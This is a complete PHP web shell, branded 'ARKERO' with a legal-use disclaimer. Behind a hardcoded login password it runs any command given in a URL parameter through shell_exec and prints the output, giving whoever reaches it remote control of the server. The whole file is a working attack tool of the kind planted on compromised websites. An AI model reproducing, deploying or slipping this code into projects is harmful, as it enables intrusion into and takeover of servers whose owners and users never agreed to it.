<?php
session_start();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Shell</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #0f0;
        }
        .container {
            max-width: 600px;
            margin: 100px auto;
            background-color: #111;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }
        h2 {
            color: #0f0;
            text-align: center;
        }
        .login-form {
            text-align: center;
        }
        input[type="password"] {
            padding: 8px;
            border-radius: 4px;
            border: 1px solid #0f0;
            width: 200px;
            background-color: #000;
            color: #0f0;
            margin: 10px;
            font-family: 'Courier New', Courier, monospace;
            letter-spacing: 2px;
        }
        button {
            padding: 10px 20px;
            border: none;
            background-color: #00f;
            color: #fff;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'Courier New', Courier, monospace;
            letter-spacing: 2px;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #0ff;
        }
        pre {
            background-color: #222;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
<div class="container">
    <h2>Welcome to Web Shell</h2>
    <p>This tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.</p>
    <p>Respectfully, ARKERO</p>

    <?php
    // Check if the form is submitted
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Define the expected password
        $expectedPassword = 'Arquero99.+';

        // Get the entered password from the form
        $enteredPassword = $_POST['password'];

        // Check if the entered password matches the expected password
        if ($enteredPassword === $expectedPassword) {
            // Password is correct, set the session variable
            $_SESSION['authenticated'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit();
        } else {
            // Password is incorrect, display an error message
            echo '<p style="color: red; text-align: center;">Invalid password. Access denied.</p>';
        }
    }

    // Check if the user is not logged in, display the login form
    if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
        ?>
        <div class="login-form">
            <form method="POST" action="">
                <input type="password" name="password" placeholder="Enter Password" autocomplete="off" autofocus required>
                <br>
                <button type="submit">Login</button>
            </form>
        </div>
        <?php
        // Stop executing the rest of the script
        exit();
    }
    ?>

    <!-- Remote Code Execution -->
    <h2>Remote Code Execution</h2>
    <form method="GET" action="">
        <input type="text" name="command" placeholder="Enter Command" size="50" value="<?php echo isset($_GET['command']) ? htmlspecialchars($_GET['command']) : ''; ?>" />
        <button type="submit">Execute</button>
    </form>

    <?php
    if (isset($_GET['command'])) {
        $command = $_GET['command'];
        echo '<pre>';
        echo 'Command: ' . $command . "\n";
        echo 'Output:' . "\n";
        echo shell_exec($command);
        echo '</pre>';
    }
    ?>

    <!-- More functionalities... -->

    <!-- Logout -->
    <h2>Logout</h2>
    <form method="POST" action="">
        <input type="hidden" name="logout" value="true" />
        <button type="submit">Logout</button>
    </form>
    <?php
    if (isset($_POST['logout']) && $_POST['logout'] === 'true') {
        // Destroy the session and redirect to the login form
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit();
    }
    ?>
</div>
</body>
</html>
